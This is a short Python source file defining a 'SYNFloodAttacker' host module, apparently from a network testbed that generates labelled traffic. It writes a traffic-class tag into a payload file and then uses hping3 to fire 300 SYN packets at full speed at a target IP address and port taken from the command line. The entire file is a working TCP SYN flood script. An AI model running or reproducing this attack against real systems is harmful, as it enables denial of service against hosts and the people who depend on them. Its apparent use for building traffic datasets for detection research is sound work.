#! /usr/bin/env python

from HostBehaviour import HostModule
import sys
import httplib
import time

import subprocess
import os

class SYNFloodAttacker(HostModule):
	def __init__(self, *args):
		super(SYNFloodAttacker, self).__init__(*args)

	def clientBehaviour(self):
		# parse parameters for the target/type of attack etc.

		payload = open("SYNPayload.txt", "w")
		payload.write("class=%s" % self.trafficClass)
		payload.close()

		# HTTP TCP SYN Flood
		bashCommand = "hping3 " + self.targetIPAddr + " -I eth0 -q -n -d 40 -E SYNPayload.txt -S -p " \
			+ str(self.targetPort) + " -s " + str(self.selfPort) + " --faster -c 300"

		my_env = os.environ.copy()
		process = subprocess.Popen(bashCommand.split())

		output, error = process.communicate()

if __name__ == '__main__':
	selfIPAddress = sys.argv[1]
	selfPort = int(sys.argv[2])
	targetIPAddress = sys.argv[3]
	targetPort = int(sys.argv[4])
	trafficClass = sys.argv[5]

	# the regular client takes the address and port assigned to it
	# the attacker will also need to include the address and the port it wishes to target

	host = SYNFloodAttacker(selfIPAddress, int(selfPort), targetIPAddress, int(targetPort), trafficClass)
	host.clientExecute()
